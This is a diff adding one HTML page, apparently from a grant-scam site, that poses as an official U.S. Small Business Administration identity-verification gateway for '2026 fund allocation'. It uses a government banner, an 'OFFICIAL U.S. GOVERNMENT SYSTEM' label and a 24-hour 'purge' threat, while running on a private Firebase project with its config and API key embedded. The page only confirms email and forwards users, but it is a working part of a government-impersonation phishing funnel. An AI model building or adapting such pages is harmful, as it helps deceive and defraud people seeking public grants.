@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA Portal | Identity Verification</title>
+    <style>
+        :root { --sba-blue: #00274c; --sba-accent: #0071bc; }
+        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', sans-serif; }
+        
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        .pulse-text { animation: pulse 2s infinite; }
+
+        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
+        .nav-header { background: var(--sba-blue); padding: 16px; text-align: center; }
+        
+        .container { max-width: 420px; margin: 20px auto; padding: 0 15px; }
+        .card { background: white; padding: 40px 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border-top: 6px solid var(--sba-accent); text-align: center; }
+        
+        .status-pill { display: inline-block; padding: 6px 15px; border-radius: 20px; font-size: 11px; font-weight: 800; text-transform: uppercase; margin-bottom: 25px; }
+        .status-pill.pending { background: #fff7ed; color: #9a3412; border: 1px solid #ffedd5; }
+        .status-pill.verified { background: #ecfdf5; color: #065f46; border: 1px solid #d1fae5; }
+
+        .instruction-box { background: #f0f7ff; border: 1px solid #dbeafe; padding: 20px; border-radius: 12px; text-align: left; margin: 25px 0; }
+        .instruction-box b { font-size: 10px; color: #1e40af; text-transform: uppercase; display: block; margin-bottom: 10px; }
+        .instruction-box li { font-size: 12px; color: #1e40af; margin-bottom: 8px; line-height: 1.4; }
+
+        .btn-refresh { background: var(--sba-accent); color: white; padding: 16px; border-radius: 8px; width: 100%; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
+        .btn-logout { background: transparent; color: #64748b; padding: 12px; width: 100%; border: 1px solid #cbd5e1; border-radius: 8px; margin-top: 15px; font-weight: 700; cursor: pointer; font-size: 11px; }
+    </style>
+</head>
+<body>
+
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURITY GATEWAY
+    </div>
+
+    <div class="nav-header">
+        <h1 style="color:white; margin:0; font-size:14px; letter-spacing:2px; font-weight: 900;">SECURITY PROTOCOL</h1>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <div id="statusPill" class="status-pill pending pulse-text">Awaiting Email Confirmation</div>
+            
+            <div style="font-size: 50px; margin-bottom: 15px;">📩</div>
+            <h2 style="color: var(--sba-blue); margin: 0; font-size: 22px;">Confirm Your Identity</h2>
+            <p style="color: #64748b; font-size: 13px; margin-top: 10px; line-height: 1.5;">
+                A secure 2026 activation link has been sent to your inbox. You must confirm your email to authorize the fund allocation.
+            </p>
+
+            <div class="instruction-box">
+                <b>Required Steps:</b>
+                <ul style="margin:0; padding-left:15px;">
+                    <li>Open your registered email inbox.</li>
+                    <li>Look for <b>"Verify your email for sba-grant-2026"</b></li>
+                    <li>Click the <b>verification link</b> provided.</li>
+                    <li>Return here to access your dashboard.</li>
+                </ul>
+            </div>
+
+            <button onclick="location.reload()" class="btn-refresh">I've Verified My Email</button>
+            <button id="logoutBtn" class="btn-logout">CANCEL & SIGN OUT</button>
+
+            <p style="text-align: center; margin-top: 25px; font-size: 11px; color: #94a3b8;">
+                Missing the email? <a href="#" id="resendBtn" style="color: var(--sba-accent); text-decoration: none; font-weight: 800;">RESEND LINK</a>
+            </p>
+        </div>
+        
+        <p style="text-align: center; font-size: 9px; color: #94a3b8; margin-top: 20px; line-height: 1.4; padding: 0 20px;">
+            <b>NOTICE:</b> Unverified accounts are purged from the 2026 allocation queue after 24 hours of inactivity.
+        </p>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+        import { getAuth, onAuthStateChanged, reload, signOut, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
+            authDomain: "sba-grant-2026.firebaseapp.com",
+            projectId: "sba-grant-2026",
+            storageBucket: "sba-grant-2026.firebasestorage.app",
+            messagingSenderId: "838430821326",
+            appId: "1:838430821326:web:6438deacb334076a64f99f"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const pill = document.getElementById('statusPill');
+
+        onAuthStateChanged(auth, async (user) => {
+            if (!user) { window.location.href = 'index.html'; return; }
+
+            // Check if user is already verified upon landing
+            if (user.emailVerified) {
+                window.location.href = 'welcome.html';
+                return;
+            }
+
+            // Real-time check for verification status
+            const checkInterval = setInterval(async () => {
+                try {
+                    await reload(user);
+                    if (user.emailVerified) {
+                        clearInterval(checkInterval);
+                        pill.innerText = "IDENTITY CONFIRMED ✓";
+                        pill.className = "status-pill verified";
+                        pill.classList.remove('pulse-text');
+                        
+                        // Push to Welcome Memorandum
+                        setTimeout(() => { window.location.href = 'welcome.html'; }, 1500);
+                    }
+                } catch (e) {
+                    console.error("Auto-reload failed");
+                }
+            }, 3000);
+        });
+
+        // Resend Verification Email
+        let resendCooldown = false;
+        document.getElementById('resendBtn').onclick = async (e) => {
+            e.preventDefault();
+            if (resendCooldown) return alert("Please wait 60 seconds before requesting a new link.");
+            
+            try {
+                await sendEmailVerification(auth.currentUser);
+                alert("SUCCESS: A new security link has been dispatched to your inbox.");
+                resendCooldown = true;
+                setTimeout(() => { resendCooldown = false; }, 60000);
+            } catch(err) {
+                alert("Too many requests. Please check your spam folder.");
+            }
+        };
+
+        document.getElementById('logoutBtn').onclick = () => {
+            signOut(auth).then(() => { window.location.href = 'index.html'; });
+        };
+    </script>
+</body>
+</html>
